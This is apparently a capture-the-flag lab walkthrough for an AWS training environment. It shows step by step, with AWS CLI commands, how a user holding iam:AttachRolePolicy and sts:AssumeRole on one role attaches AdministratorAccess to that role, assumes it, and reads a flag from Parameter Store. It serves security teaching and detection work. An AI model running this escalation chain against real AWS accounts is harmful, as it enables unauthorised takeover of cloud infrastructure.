# Guided Walkthrough: One-Hop Privilege Escalation: iam:AttachRolePolicy + sts:AssumeRole

This scenario demonstrates a privilege escalation vulnerability where a user has permission to both attach managed policies to a role AND assume that role. Unlike self-escalation scenarios where a role modifies its own permissions, this scenario involves lateral movement — a user modifying a different principal (a role) and then assuming it to gain elevated privileges.

The combination of `iam:AttachRolePolicy` and `sts:AssumeRole` on the same target role creates a complete privilege escalation path. Even if the target role initially has minimal or no privileges, the attacker can attach the AWS-managed `AdministratorAccess` policy to it and then assume the newly-privileged role to gain full administrative access.

This pattern is particularly dangerous because it may appear safe at first glance — the user doesn't directly have admin permissions, and the target role may only have read-only access. However, write access to a role's policy combined with the ability to assume that role is functionally equivalent to having administrative access.

## The Challenge

You start as the IAM user `pl-prod-iam-014-to-admin-starting-user`. This user has no administrative permissions — attempting to list IAM users or perform any privileged action will fail. Your goal is to obtain full administrative access to the AWS account.

You have been handed credentials for this user (available via Terraform outputs). Two permissions stand out in your policy: `iam:AttachRolePolicy` scoped to `pl-prod-iam-014-to-admin-target-role`, and `sts:AssumeRole` also scoped to that same role. The target role itself starts with minimal permissions. You need to connect those two capabilities to climb to admin.

## Reconnaissance

First, confirm your identity and establish what you're working with.

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-iam-014-to-admin-starting-user
```

Confirm you don't have admin access yet — this establishes your baseline:

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) when calling the ListUsers operation: ...
```

Now check what's currently attached to the target role:

```bash
aws iam list-attached-role-policies \
    --role-name pl-prod-iam-014-to-admin-target-role \
    --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    --output table
# (No managed policies attached)
```

The role is a blank slate. Because you hold `iam:AttachRolePolicy` on it, you can change that.

## Exploitation

Attach the AWS-managed `AdministratorAccess` policy to the target role:

```bash
aws iam attach-role-policy \
    --role-name pl-prod-iam-014-to-admin-target-role \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

IAM policy changes take a moment to propagate across AWS infrastructure. Wait 15 seconds before proceeding:

```bash
sleep 15
```

Now assume the newly-privileged role:

```bash
CREDENTIALS=$(aws sts assume-role \
    --role-arn arn:aws:iam::<account_id>:role/pl-prod-iam-014-to-admin-target-role \
    --role-session-name escalation-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

## Verification

With the assumed role credentials active, confirm you now have administrative access:

```bash
aws iam list-users --max-items 3 --output table
```

This time the call succeeds. You are now operating as `pl-prod-iam-014-to-admin-target-role` with full `AdministratorAccess` permissions.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:assumed-role/pl-prod-iam-014-to-admin-target-role/escalation-session
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to the target role provides implicitly.

Using your assumed role credentials (the temporary credentials from `aws sts assume-role`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-014-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You started with a user that appeared to have limited, tightly scoped permissions. But `iam:AttachRolePolicy` on a role you can also assume is functionally equivalent to being able to grant yourself admin — you just have to go through the role to get there.

The attack chain: starting user attaches `AdministratorAccess` to the target role, then assumes it. Two API calls and 15 seconds of waiting is all it takes to go from no access to full administrator. In real environments this pattern appears whenever developers scope `iam:AttachRolePolicy` to a specific role for "safe" policy management, without realizing that the same principal can also assume that role. CSPM tools that analyze permissions in isolation will flag the `iam:AttachRolePolicy` permission; tools that understand the full attack graph will identify the combined `AttachRolePolicy` + `AssumeRole` on the same resource as a complete escalation path.
